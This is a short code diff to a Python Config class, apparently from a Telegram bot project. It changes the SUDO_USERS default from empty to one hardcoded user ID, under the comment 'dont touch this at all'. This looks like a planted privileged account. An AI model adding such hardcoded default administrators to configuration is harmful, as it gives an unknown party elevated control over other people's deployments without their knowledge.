@@ -172,7 +172,7 @@ class Config(object):
     # For updater plugin
     UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "master")
     # dont touch this at all
-    SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
+    SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "705475246").split())
 
 
 class Production(Config):
